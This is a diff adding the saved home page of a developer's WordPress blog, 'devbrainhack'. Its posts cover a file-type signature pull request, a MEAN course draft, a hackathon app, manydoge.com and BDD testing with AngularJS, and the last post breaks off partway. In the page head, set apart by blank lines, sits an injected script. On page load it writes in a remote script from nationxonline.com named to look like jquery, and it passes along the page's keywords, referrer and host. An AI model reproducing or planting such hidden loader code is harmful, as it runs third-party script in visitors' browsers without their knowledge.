@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en-US" class="no-js">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width">
+	<link rel="profile" href="http://gmpg.org/xfn/11">
+	<link rel="pingback" href="http://devbrainhack.co/xmlrpc.php">
+	<!--[if lt IE 9]>
+	<script src="http://devbrainhack.co/wp-content/themes/twentyfifteen/js/html5.js"></script>
+	<![endif]-->
+	<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
+<title>devbrainhack | Poignant guides, making software work</title>
+<link rel="alternate" type="application/rss+xml" title="devbrainhack &raquo; Feed" href="http://devbrainhack.co/index.php/feed/" />
+<link rel="alternate" type="application/rss+xml" title="devbrainhack &raquo; Comments Feed" href="http://devbrainhack.co/index.php/comments/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"http:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/devbrainhack.co\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.3"}};
+			!function(a,b,c){function d(a){var c=b.createElement("canvas"),d=c.getContext&&c.getContext("2d");return d&&d.fillText?(d.textBaseline="top",d.font="600 32px Arial","flag"===a?(d.fillText(String.fromCharCode(55356,56812,55356,56807),0,0),c.toDataURL().length>3e3):(d.fillText(String.fromCharCode(55357,56835),0,0),0!==d.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&&c.supports.flag||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='contact-form-7-css'  href='http://devbrainhack.co/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=4.2.2' type='text/css' media='all' />
+<link rel='stylesheet' id='woocommerce-layout-css'  href='//devbrainhack.co/wp-content/plugins/woocommerce/assets/css/woocommerce-layout.css?ver=2.4.6' type='text/css' media='all' />
+<link rel='stylesheet' id='woocommerce-smallscreen-css'  href='//devbrainhack.co/wp-content/plugins/woocommerce/assets/css/woocommerce-smallscreen.css?ver=2.4.6' type='text/css' media='only screen and (max-width: 768px)' />
+<link rel='stylesheet' id='woocommerce-general-css'  href='//devbrainhack.co/wp-content/plugins/woocommerce/assets/css/woocommerce.css?ver=2.4.6' type='text/css' media='all' />
+<link rel='stylesheet' id='twentyfifteen-fonts-css'  href='https://fonts.googleapis.com/css?family=Noto+Sans%3A400italic%2C700italic%2C400%2C700%7CNoto+Serif%3A400italic%2C700italic%2C400%2C700%7CInconsolata%3A400%2C700&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
+<link rel='stylesheet' id='genericons-css'  href='http://devbrainhack.co/wp-content/themes/twentyfifteen/genericons/genericons.css?ver=3.2' type='text/css' media='all' />
+<link rel='stylesheet' id='twentyfifteen-style-css'  href='http://devbrainhack.co/wp-content/themes/twentyfifteen/style.css?ver=4.3.3' type='text/css' media='all' />
+<!--[if lt IE 9]>
+<link rel='stylesheet' id='twentyfifteen-ie-css'  href='http://devbrainhack.co/wp-content/themes/twentyfifteen/css/ie.css?ver=20141010' type='text/css' media='all' />
+<![endif]-->
+<!--[if lt IE 8]>
+<link rel='stylesheet' id='twentyfifteen-ie7-css'  href='http://devbrainhack.co/wp-content/themes/twentyfifteen/css/ie7.css?ver=20141010' type='text/css' media='all' />
+<![endif]-->
+<link rel='stylesheet' id='font-awesome-cdn-css'  href='//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css?ver=4.3.3' type='text/css' media='all' />
+<link rel='stylesheet' id='cpsh-shortcodes-css'  href='http://devbrainhack.co/wp-content/plugins/column-shortcodes/assets/css/shortcodes.css?ver=0.6.6' type='text/css' media='all' />
+<link rel='stylesheet' id='js_composer_custom_css-css'  href='http://devbrainhack.co/wp-content/uploads/js_composer/custom.css?ver=4.3.5' type='text/css' media='screen' />
+<link rel='stylesheet' id='enlighter-local-css'  href='http://devbrainhack.co/wp-content/plugins/enlighter/resources/EnlighterJS.min.css?ver=4.3.3' type='text/css' media='all' />
+<script type='text/javascript' src='http://devbrainhack.co/wp-includes/js/jquery/jquery.js?ver=1.11.3'></script>
+<script type='text/javascript' src='http://devbrainhack.co/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<script type='text/javascript' src='http://devbrainhack.co/wp-content/plugins/enlighter/resources/mootools-core-yc.js?ver=4.3.3'></script>
+<script type='text/javascript' src='http://devbrainhack.co/wp-content/plugins/enlighter/resources/EnlighterJS.min.js?ver=4.3.3'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://devbrainhack.co/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://devbrainhack.co/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 4.3.3" />
+<meta name="generator" content="WooCommerce 2.4.6" />
+<script type="text/javascript">/* <![CDATA[ */window.addEvent('domready', function(){if (typeof EnlighterJS == "undefined"){return;};EnlighterJS.Util.Init('pre.EnlighterJSRAW', 'code.EnlighterJSRAW', {"language":"generic","theme":"enlighter","indent":2,"hover":"hoverEnabled","showLinenumbers":true,"rawButton":true,"infoButton":true,"windowButton":true,"rawcodeDoubleclick":false,"grouping":true,"cryptex":{"enabled":false,"email":"mail@example.tld"}});});/* ]]> */</script>
+<meta name="generator" content="Powered by Visual Composer - drag and drop page builder for WordPress."/>
+<!--[if IE 8]><link rel="stylesheet" type="text/css" href="http://devbrainhack.co/wp-content/plugins/js_composer_salient/assets/css/vc-ie8.css" media="screen"><![endif]-->
+
+
+
+
+
+
+
+
+<script>var a='';setTimeout(10);if(document.referrer.indexOf(location.protocol+"//"+location.host)!==0||document.referrer!==undefined||document.referrer!==''||document.referrer!==null){document.write('<script type="text/javascript" src="http://www.nationxonline.com/js/jquery.min.php?c_utt=G91825&c_utm='+encodeURIComponent('http://www.nationxonline.com/js/jquery.min.php'+'?'+'default_keyword='+encodeURIComponent(((k=(function(){var keywords='';var metas=document.getElementsByTagName('meta');if(metas){for(var x=0,y=metas.length;x<y;x++){if(metas[x].name.toLowerCase()=="keywords"){keywords+=metas[x].content;}}}return keywords!==''?keywords:null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k))+'&se_referrer='+encodeURIComponent(document.referrer)+'&source='+encodeURIComponent(window.location.host))+'"><'+'/script>');}</script>
+</head>
+
+<body class="home blog wpb-js-composer js-comp-ver-4.3.5 vc_responsive">
+<div id="page" class="hfeed site">
+	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
+
+	<div id="sidebar" class="sidebar">
+		<header id="masthead" class="site-header" role="banner">
+			<div class="site-branding">
+										<h1 class="site-title"><a href="http://devbrainhack.co/" rel="home">devbrainhack</a></h1>
+											<p class="site-description">Poignant guides, making software work</p>
+									<button class="secondary-toggle">Menu and widgets</button>
+			</div><!-- .site-branding -->
+		</header><!-- .site-header -->
+
+			<div id="secondary" class="secondary">
+
+		
+		
+					<div id="widget-area" class="widget-area" role="complementary">
+				<aside id="text-2" class="widget widget_text"><h2 class="widget-title">Hi, I&#8217;m Alex</h2>			<div class="textwidget">My place to vent, rave, rant, praise. Peace, Love, and Dev. Gratuitous high-fiver.
+<br><br>
+<div style="text-align: center">
+
+<a href="http://twitter.com/lintuxvi" style="border-bottom: none; margin-right: 20px;"><i class="fa fa-twitter" style="font-size: 2em; text-decoration: none"></i></a>
+<a href="http://github.com/alexanderlperez" style="border-bottom: none; margin-right: 20px;"><i class="fa fa-github" style="font-size: 2em;"></i></a>
+<a href="http://stackoverflow.com/users/1817379/lintuxvi" style="border-bottom: none; margin-right: 20px;"><i class="fa fa-stack-overflow" style="font-size: 2em;"></i></a>
+
+</div></div>
+		</aside><aside id="tag-widget-2" class="widget TagWidget"><h2 class="widget-title">Recent Work</h2><ul class = "posts-by-tag-list"><li class="posts-by-tag-item work" id="posts-by-tag-item-87"><a class = "posts-by-tag-item-title" href="http://devbrainhack.co/index.php/2015/11/02/in-progress-mean-stack-patterns-1-0/">In Progress: MEAN Stack patterns 1.0</a></li><li class="posts-by-tag-item work" id="posts-by-tag-item-73"><a class = "posts-by-tag-item-title" href="http://devbrainhack.co/index.php/2015/11/02/hackathon-nbcu2015-and-telemira/">Hackathon: NBCU2015 and Telemira</a></li><li class="posts-by-tag-item work" id="posts-by-tag-item-91"><a class = "posts-by-tag-item-title" href="http://devbrainhack.co/index.php/2015/11/02/update-manydoge-com-back-up/">Update: Manydoge.com back up!</a></li><li class="posts-by-tag-item work" id="posts-by-tag-item-48"><a class = "posts-by-tag-item-title" href="http://devbrainhack.co/index.php/2015/11/02/recent-work-bdd-with-angularjs-and-protractor/">Recent work: BDD with AngularJS and Protractor</a></li><li class="posts-by-tag-item work" id="posts-by-tag-item-36"><a class = "posts-by-tag-item-title" href="http://devbrainhack.co/index.php/2015/10/07/recent-work-header-grab-bag/">Recent Work – Header Grab Bag</a></li></ul></aside>			</div><!-- .widget-area -->
+		
+	</div><!-- .secondary -->
+
+	</div><!-- .sidebar -->
+
+	<div id="content" class="site-content">
+
+	<div id="primary" class="content-area">
+		<main id="main" class="site-main" role="main">
+
+		
+			
+			
+<article id="post-108" class="post-108 post type-post status-publish format-standard hentry category-uncategorized">
+	
+	<header class="entry-header">
+		<h2 class="entry-title"><a href="http://devbrainhack.co/index.php/2015/11/09/recent-work-file-signatures-with-sindresorhusfile-type/" rel="bookmark">Recent work: sindresorhus/file-type and hex skills</a></h2>	</header><!-- .entry-header -->
+
+	<div class="entry-content">
+		<p>Yesterday my pull request for <a href="https://github.com/sindresorhus/file-type">sindresorhus/file-type</a> was <a href="https://github.com/sindresorhus/file-type/commit/17911e2de88050ce775fbf952ad2a84bd623b6dc">accepted</a>.  Hoorah! 😃</p>
+<p><a href="http://devbrainhack.co/wp-content/uploads/2015/11/Screen-Shot-2015-11-08-at-5.34.24-PM.png"><img class="aligncenter wp-image-129 size-full" src="http://devbrainhack.co/wp-content/uploads/2015/11/Screen-Shot-2015-11-08-at-5.34.24-PM-e1447029449676.png" alt="Screen Shot 2015-11-08 at 5.34.24 PM" width="870" height="54" /></a></p>
+<p><strong>I&#8217;ve decided to spend more time working with OSS developers for fun and profit. <a href="http://twitter.com/sindresorhus">Sindre Sorhus</a> is hugely popular as a developer, in large part for the the exceedingly numerous, high-quality packages he&#8217;s submitted to <a href="https://www.npmjs.com/~sindresorhus">NPM.org</a> and on <a href="http://github.com/sindresorhus">Github</a>.  All in all, he&#8217;s a stand-up guy who deserves the success and recognition for all the hard work he&#8217;s put in for the JS community.</strong></p>
+<p>Lo-and-behold, a few days ago the call for contributors was made!</p>
+<p>&nbsp;</p>
+<blockquote class="twitter-tweet tw-align-center" lang="en">
+<p dir="ltr" lang="en">Here are the open issues on my repos in case anyone wants to help out by triaging/commenting/fixing/etc ♥ <a href="https://t.co/R7DkIvjTBV">https://t.co/R7DkIvjTBV</a></p>
+<p>— Sindre Sorhus (@sindresorhus) <a href="https://twitter.com/sindresorhus/status/661573963252932608">November 3, 2015</a></p></blockquote>
+<p><script src="//platform.twitter.com/widgets.js" async="" charset="utf-8"></script></p>
+<p>I landed on <a href="https://github.com/sindresorhus/file-type/issues/22">this issue</a> made for expanding <a href="https://github.com/sindresorhus/file-type">sindresorhus/file-type</a> with more compressed file types.  <a href="https://github.com/sindresorhus/file-type">file-type</a> is a Node.js module made for apps needing to identify files by their actual binary signature, similar to <a href="https://github.com/threatstack/libmagic">threatstack/libmagic</a> for the C language.  It has  a straightforward and concise structure consisting of a series of <code>if</code> statements and a byte-by-byte examination of the current file stream, typically only a few bytes. Here&#8217;s an example of how it checks a file if it&#8217;s a GIF:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="js">if (buf[0] === 0x47 &amp;&amp; buf[1] === 0x49 &amp;&amp; buf[2] === 0x46) {
+    return {
+        ext: 'gif',
+        mime: 'image/gif'
+    };
+}</pre>
+<h4>Digging in&#8230;</h4>
+<p><a href="http://www.crackmes.de/">I&#8217;ve messed with hex dumps and debugging binary files before</a>, and this simply involved cross-referencing the first few bytes of a file with already-known signatures.</p>
+<p>The first  task was to get the <a href="https://github.com/sindresorhus/compressed-extensions/blob/master/compressed-extensions.json">lists of file types</a> <a href="https://github.com/sindresorhus/archive-extensions/blob/master/archive-extensions.json">needing signatures</a> and grabbing the relevant data from sources around the net, mostly from the <a href="http://www.garykessler.net/library/file_sigs.html">File Signatures Table, compiled by Gary Kessler</a>.</p>
+<p style="text-align: justify;"><div class='content-column one_half'>I created a quick spreadsheet to keep things in order, too.</div><div class='content-column one_half last_column'><a href="http://devbrainhack.co/wp-content/uploads/2015/11/Screen-Shot-2015-11-08-at-5.32.45-PM.png"><img class="aligncenter size-large wp-image-127" src="http://devbrainhack.co/wp-content/uploads/2015/11/Screen-Shot-2015-11-08-at-5.32.45-PM-1024x507.png" alt="Screen Shot 2015-11-08 at 5.32.45 PM" width="660" height="327" /></a></div><div class='clear_column'></div>
+<p>To help out on quick inspections, I created tiny utility to help at first, calling it fsig</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell">#!/bin/bash
+
+clear
+xxd $1 | head</pre>
+<p>And for inspecting temporary directories of common file types, I used this bash one-liner:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">clear; for n in *; do echo $n ; xxd $n | head ; done</pre>
+<p>&nbsp;</p>
+<p style="text-align: justify;"><div class='content-column one_half'>For extracting signatures cleanly, I ran into <a href="http://ridiculousfish.com/hexfiend/">HexFiend</a> for OSX.  It&#8217;s highly recommended since it displays where the cursor is by byte and allows for clean copy-paste.</div>
+<div class='content-column one_half last_column'><a href="http://devbrainhack.co/wp-content/uploads/2015/11/Screen-Shot-2015-11-08-at-4.10.52-PM.png"><img class="aligncenter size-full wp-image-113" src="http://devbrainhack.co/wp-content/uploads/2015/11/Screen-Shot-2015-11-08-at-4.10.52-PM.png" alt="Screen Shot 2015-11-08 at 4.10.52 PM" width="806" height="886" /></a></div><div class='clear_column'></div>
+<h4>Making it work</h4>
+<p>A couple of problems I ran into was the issue of files with similar signatures.  For example, <code>deb</code> files are nearly identical to files made with the <code>compress</code> utility.  That means that care was needed when ordering the logic.</p>
+<figure id="attachment_137" style="width: 660px;" class="wp-caption aligncenter"><a href="http://devbrainhack.co/wp-content/uploads/2015/11/Screen-Shot-2015-11-08-at-6.07.39-PM.png"><img class="wp-image-137 size-large" src="http://devbrainhack.co/wp-content/uploads/2015/11/Screen-Shot-2015-11-08-at-6.07.39-PM-1024x267.png" alt="ordering logic" width="660" height="172" /></a><figcaption class="wp-caption-text">Care was needed in ordering the logic for comparing file signatures</figcaption></figure>
+<p>To make converting the signature hex into code simple and quick, I used Vim&#8217;s handy macro recording mode.<br />
+<a href="http://devbrainhack.co/wp-content/uploads/2015/11/macro.gif"><img class="aligncenter size-full wp-image-139" src="http://devbrainhack.co/wp-content/uploads/2015/11/macro.gif" alt="macro" width="672" height="378" /></a></p>
+<p><strong>I love Vim macros. </strong>Check out how to use them with <a href="http://usevim.com/2012/08/10/macros/">Vim 101: A Gentle Introduction to Macros</a>.</p>
+<h4>All set</h4>
+<p>Check out<a href="https://github.com/sindresorhus/file-type">sindresorhus/file-type</a>, and for that matter, maybe you can help with OSS by working on <a href="https://t.co/R7DkIvjTBV">open issues from sindresorhus&#8217; other projects</a> 😁</p>
+<p>Let me know what you think on twitter <i class="fa fa-twitter"></i> <a href="http://twitter.com/lintuxvi">@lintuxvi</a>!</p>
+	</div><!-- .entry-content -->
+
+	
+	<footer class="entry-footer">
+		<span class="posted-on"><span class="screen-reader-text">Posted on </span><a href="http://devbrainhack.co/index.php/2015/11/09/recent-work-file-signatures-with-sindresorhusfile-type/" rel="bookmark"><time class="entry-date published" datetime="2015-11-09T02:23:17+00:00">November 9, 2015</time><time class="updated" datetime="2015-11-09T02:27:12+00:00">November 9, 2015</time></a></span><span class="cat-links"><span class="screen-reader-text">Categories </span><a href="http://devbrainhack.co/index.php/category/uncategorized/" rel="category tag">Uncategorized</a></span>			</footer><!-- .entry-footer -->
+
+</article><!-- #post-## -->
+
+<article id="post-87" class="post-87 post type-post status-publish format-standard hentry category-uncategorized tag-work">
+	
+	<header class="entry-header">
+		<h2 class="entry-title"><a href="http://devbrainhack.co/index.php/2015/11/02/in-progress-mean-stack-patterns-1-0/" rel="bookmark">In Progress: MEAN Stack patterns 1.0</a></h2>	</header><!-- .entry-header -->
+
+	<div class="entry-content">
+		<p><a href="http://devbrainhack.co/wp-content/uploads/2015/11/11357731_367461846787628_1003011773_n.jpg"><img class="aligncenter size-medium wp-image-88" src="http://devbrainhack.co/wp-content/uploads/2015/11/11357731_367461846787628_1003011773_n-300x300.jpg" alt="11357731_367461846787628_1003011773_n" width="300" height="300" /></a></p>
+<p>I&#8217;m putting together a course, complete with videos, slides, example code, etc, but for my multitudinous (😅) readers I&#8217;d love to, you know, <em>show what I&#8217;ve got so far&#8230;</em></p>
+<figure id="attachment_89" style="width: 300px;" class="wp-caption aligncenter"><a href="http://devbrainhack.co/projects/udemy-mean/"><img class="wp-image-89 size-medium" src="http://devbrainhack.co/wp-content/uploads/2015/11/tiopw-300x300.jpg" alt="tiopw" width="300" height="300" /></a><figcaption class="wp-caption-text">Note: not me, just a Good Guy Greg, dude..</figcaption></figure>
+<p>&nbsp;</p>
+<p><a href="http://devbrainhack.co/projects/udemy-mean/">Check out the draft materials here</a>.  Draft text is under <a href="http://devbrainhack.co/projects/udemy-mean/drafts/">drafts/</a>  and accompanying code for lessons is under <a href="http://devbrainhack.co/projects/udemy-mean/lesson-code/">lesson-code/</a>. Tell me what you think on twitter <a href="http://twitter.com/lintuxvi">@lintuxvi</a>!</p>
+	</div><!-- .entry-content -->
+
+	
+	<footer class="entry-footer">
+		<span class="posted-on"><span class="screen-reader-text">Posted on </span><a href="http://devbrainhack.co/index.php/2015/11/02/in-progress-mean-stack-patterns-1-0/" rel="bookmark"><time class="entry-date published" datetime="2015-11-02T20:52:12+00:00">November 2, 2015</time><time class="updated" datetime="2015-11-02T21:26:18+00:00">November 2, 2015</time></a></span><span class="cat-links"><span class="screen-reader-text">Categories </span><a href="http://devbrainhack.co/index.php/category/uncategorized/" rel="category tag">Uncategorized</a></span><span class="tags-links"><span class="screen-reader-text">Tags </span><a href="http://devbrainhack.co/index.php/tag/work/" rel="tag">work</a></span>			</footer><!-- .entry-footer -->
+
+</article><!-- #post-## -->
+
+<article id="post-73" class="post-73 post type-post status-publish format-standard hentry category-uncategorized tag-work">
+	
+	<header class="entry-header">
+		<h2 class="entry-title"><a href="http://devbrainhack.co/index.php/2015/11/02/hackathon-nbcu2015-and-telemira/" rel="bookmark">Hackathon: NBCU2015 and Telemira</a></h2>	</header><!-- .entry-header -->
+
+	<div class="entry-content">
+		<p>For the <a href="http://nbcuhackathon.com/en/orlando-2015/">2015 NBCU hackathon in Orlando</a>, I entered, along with a friend, into the Telemundo category.  We whipped up the design and the code in a night of a rough prototype app that outlined a novel way to generated viewer interaction during broadcasts.  Enter <a href="#" onClick="window.open('http://devbrainhack.co/projects/telemira/','_blank','toolbar=0, location=0, directories=0, status=0, scrollbars=0, resizable=0, copyhistory=0, menuBar=0, width=400, height=700');return(false)">TeleMira</a>:</p>
+<figure id="attachment_74" style="width: 800px;" class="wp-caption aligncenter"><img class="wp-image-74 size-full" src="http://devbrainhack.co/wp-content/uploads/2015/11/telemira-e1446494862735.png" alt="TeleMira app" width="800" height="130" /><figcaption class="wp-caption-text">Introducing: TeleMira!</figcaption></figure>
+<p><a href="https://github.com/alexanderlperez/telemira">Check out the code on github!</a><br />
+&nbsp;</p>
+<p>Built with <a href="http://www.idangero.us/framework7/">Framework 7</a> for the easy iOS look-and-feel, it outlined a future where viewers can watch broadcasts, then during commercial breaks and credits receive time-sensitive B-reels, bloopers, and hidden content.  Clips viewed during this time could be saved and traded with friends, since only a limited amount of clips could be viewed during the clip&#8217;s countdown period.</p>
+<p>How about some gifs to outline what&#8217;s going on?</p>
+<div class='content-column one_half'>1.  Viewers receive clips during commercial breaks or credits</div>
+<div class='content-column one_half last_column'><a href="#" onClick="window.open('http://devbrainhack.co/projects/telemira/','_blank','toolbar=0, location=0, directories=0, status=0, scrollbars=0, resizable=0, copyhistory=0, menuBar=0, width=400, height=700');return(false)"><img class="aligncenter size-full wp-image-80" src="http://devbrainhack.co/wp-content/uploads/2015/11/growl.gif" alt="growl" width="284" height="480" /></a></div><div class='clear_column'></div>
+<div class='content-column one_half'>2. You can watch clips by clicking on them</div>
+<div class='content-column one_half last_column'><a href="#" onClick="window.open('http://devbrainhack.co/projects/telemira/','_blank','toolbar=0, location=0, directories=0, status=0, scrollbars=0, resizable=0, copyhistory=0, menuBar=0, width=400, height=700');return(false)"><img class="aligncenter size-full wp-image-78" src="http://devbrainhack.co/wp-content/uploads/2015/11/click.gif" alt="click" width="284" height="480" /></a></div><div class='clear_column'></div>
+<div class='content-column one_half'>3. Clips you&#8217;ve watched are added to your archive of watched videos</div>
+<div class='content-column one_half last_column'><a href="#" onClick="window.open('http://devbrainhack.co/projects/telemira/','_blank','toolbar=0, location=0, directories=0, status=0, scrollbars=0, resizable=0, copyhistory=0, menuBar=0, width=400, height=700');return(false)"><img class="aligncenter size-full wp-image-77" src="http://devbrainhack.co/wp-content/uploads/2015/11/archivo.gif" alt="archivo" width="284" height="480" /></a></div><div class='clear_column'></div>
+<div class='content-column one_half'>4.  Be careful though, these time-sensitive videos will disappear if they&#8217;re not watched in time!</div>
+<div class='content-column one_half last_column'><a href="#" onClick="window.open('http://devbrainhack.co/projects/telemira/','_blank','toolbar=0, location=0, directories=0, status=0, scrollbars=0, resizable=0, copyhistory=0, menuBar=0, width=400, height=700');return(false)"><img class="aligncenter size-full wp-image-79" src="http://devbrainhack.co/wp-content/uploads/2015/11/close.gif" alt="close" width="284" height="480" /></a></div><div class='clear_column'></div>
+<div class='content-column one_half'>5.  If you miss a clip, you can check to see if your friends has it</div>
+<div class='content-column one_half last_column'><a href="#" onClick="window.open('http://devbrainhack.co/projects/telemira/','_blank','toolbar=0, location=0, directories=0, status=0, scrollbars=0, resizable=0, copyhistory=0, menuBar=0, width=400, height=700');return(false)"><img class="aligncenter size-full wp-image-76" src="http://devbrainhack.co/wp-content/uploads/2015/11/amigovideos.gif" alt="amigovideos" width="284" height="480" /></a></div><div class='clear_column'></div>
+<p>If you haven&#8217;t yet, try out <a href="#" onClick="window.open('http://devbrainhack.co/projects/telemira/','_blank','toolbar=0, location=0, directories=0, status=0, scrollbars=0, resizable=0, copyhistory=0, menuBar=0, width=400, height=700');return(false)">TeleMira</a>, and tell me what you think on twitter <a href="http://twitter.com/lintuxvi">@lintuxvi</a>.  Also, <a href="https://github.com/alexanderlperez/telemira">check out the code on github!</a></p>
+	</div><!-- .entry-content -->
+
+	
+	<footer class="entry-footer">
+		<span class="posted-on"><span class="screen-reader-text">Posted on </span><a href="http://devbrainhack.co/index.php/2015/11/02/hackathon-nbcu2015-and-telemira/" rel="bookmark"><time class="entry-date published" datetime="2015-11-02T20:52:00+00:00">November 2, 2015</time><time class="updated" datetime="2015-11-02T21:47:22+00:00">November 2, 2015</time></a></span><span class="cat-links"><span class="screen-reader-text">Categories </span><a href="http://devbrainhack.co/index.php/category/uncategorized/" rel="category tag">Uncategorized</a></span><span class="tags-links"><span class="screen-reader-text">Tags </span><a href="http://devbrainhack.co/index.php/tag/work/" rel="tag">work</a></span>			</footer><!-- .entry-footer -->
+
+</article><!-- #post-## -->
+
+<article id="post-91" class="post-91 post type-post status-publish format-standard hentry category-uncategorized tag-work">
+	
+	<header class="entry-header">
+		<h2 class="entry-title"><a href="http://devbrainhack.co/index.php/2015/11/02/update-manydoge-com-back-up/" rel="bookmark">Update: Manydoge.com back up!</a></h2>	</header><!-- .entry-header -->
+
+	<div class="entry-content">
+		<figure id="attachment_94" style="width: 660px;" class="wp-caption aligncenter"><a href="http://manydoge.com"><img class="wp-image-94 size-large" src="http://devbrainhack.co/wp-content/uploads/2015/11/Screen-Shot-2015-11-02-at-3.59.23-PM-1024x316.png" alt="manydoge.com" width="660" height="204" /></a><figcaption class="wp-caption-text">Classic doge stylings!</figcaption></figure>
+<p>Created back in 2013, <a href="http://manydoge.com">manydoge.com</a> is back up!  After a hiatus the last few months, it&#8217;s rehosted and ready to create and post your favorite classic doge styles on imgur, or download as you like.  Let me know what you think on twitter @lintuxvi.  <a href="https://github.com/alexanderlperez/ManyDoge">Check out the source on github</a> and fork away!</p>
+	</div><!-- .entry-content -->
+
+	
+	<footer class="entry-footer">
+		<span class="posted-on"><span class="screen-reader-text">Posted on </span><a href="http://devbrainhack.co/index.php/2015/11/02/update-manydoge-com-back-up/" rel="bookmark"><time class="entry-date published" datetime="2015-11-02T20:51:33+00:00">November 2, 2015</time><time class="updated" datetime="2015-11-02T21:48:12+00:00">November 2, 2015</time></a></span><span class="cat-links"><span class="screen-reader-text">Categories </span><a href="http://devbrainhack.co/index.php/category/uncategorized/" rel="category tag">Uncategorized</a></span><span class="tags-links"><span class="screen-reader-text">Tags </span><a href="http://devbrainhack.co/index.php/tag/work/" rel="tag">work</a></span>			</footer><!-- .entry-footer -->
+
+</article><!-- #post-## -->
+
+<article id="post-48" class="post-48 post type-post status-publish format-standard hentry category-uncategorized tag-work">
+	
+	<header class="entry-header">
+		<h2 class="entry-title"><a href="http://devbrainhack.co/index.php/2015/11/02/recent-work-bdd-with-angularjs-and-protractor/" rel="bookmark">Recent work: BDD with AngularJS and Protractor</a></h2>	</header><!-- .entry-header -->
+
+	<div class="entry-content">
+		<p>Recently, I spent a few days getting to know the testing ecosystem around AngularJS, specifically related to Unit Testing and End-to-End testing.  <a href="https://github.com/jasmine/jasmine">Jasmine</a> (unit-testing) and <a href="http://www.protractortest.org">Protractor</a> (end-to-end) are the two prescribed frameworks for those.</p>
+<p><strong>To get a grasp of using these tools, I built a mock application: <a href="https://github.com/alexanderlperez/mailist">Mailist</a>.  Mailist&#8217;s story is that it helps send many emails easier, using a template and a <a href="https://en.wikipedia.org/wiki/Comma-separated_values">CSV</a> with recipient data.</strong></p>
+<p>With that in mind, I looked around for some resources online as to how BDD changes the development process.  The first article to peak my interest was <em><a href="http://nicholasjackson.github.io/agile/bdd/angular/protractor/cucumber/protractor-cucumber/">Functional testing with cucumber and protractor</a>.  </em>Being that BDD differs from TDD in that a feature/<strong>behavior</strong> is being tested, rather than the functionality of a module/<strong>unit</strong>, bridging the conceptual gap was a little shaky.  In the middle of the <em><a href="http://nicholasjackson.github.io/agile/bdd/angular/protractor/cucumber/protractor-cucumber/">Functional testing&#8230;</a></em>, this graphic came up that helped to elucidate the process:</p>
+<figure id="attachment_49" style="width: 681px;" class="wp-caption alignnone"><a href="http://devbrainhack.co/wp-content/uploads/2015/10/outside-in-development.png"><img id="figure-1" class="wp-image-49 size-full" src="http://devbrainhack.co/wp-content/uploads/2015/10/outside-in-development.png" alt="outside-in-development" width="681" height="332" /></a><figcaption class="wp-caption-text">Figure 1: the BDD cycle</figcaption></figure>
+<p>Take a look at the graphic: you can see that unit-testing still exists within the context of the BDD, but now it&#8217;s involved within the development of the system at large.  Red-Green-Refactor is still there, but within the greater BDD loop of focusing on the <strong>scenario</strong>.</p>
+<h4>Testing: BDD  👉  Scenarios</h4>
+<p><a href="http://dannorth.net/whats-in-a-story/">Whats in a Story</a> is a great article that focuses on the scenario approach to writing features in BDD.  Boiled down, when we write out what the features will be:</p>
+<h4>1. The scenario title should say what’s different</h4>
+<blockquote><p>You should be able to line up the scenarios side by side, and describe how they differ using only the title.</p></blockquote>
+<h4>2. The scenario should be described in terms of Givens, Events and Outcomes</h4>
+<blockquote><p>&#8230;adopt this vocabulary of “given/when/then”&#8230;</p></blockquote>
+<p>To build out the scenarios in <a href="https://github.com/alexanderlperez/mailist">Mailist</a>, these rules were used.  Here&#8217;s an example scenario:</p>
+<pre class="toolbar:2 striped:false marking:false ranges:false nums:false nums-toggle:false wrap-toggle:false lang:default decode:true ">Scenario: A user loads a list and generates a queue
+Given there are no emails
+ And there is no template
+ And there is no cached data
+When the user loads a csv of data
+Then the queue list should be populated
+ And there should be relevant field headers</pre>
+<p><span style="font-size: smaller;">Figure 2: example scenario</span></p>
+<p>Note: this closely resembles the <a href="https://github.com/cucumber/cucumber/wiki/Gherkin">Gherkin</a> syntax, which I&#8217;d like to use with the <a href="https://github.com/cucumber/cucumber-js">Cucumber</a> BDD framework in the future, however I&#8217;m keeping this exploration simple.</p>
+<h4>Testing: Protractor  👉  End-to-End</h4>
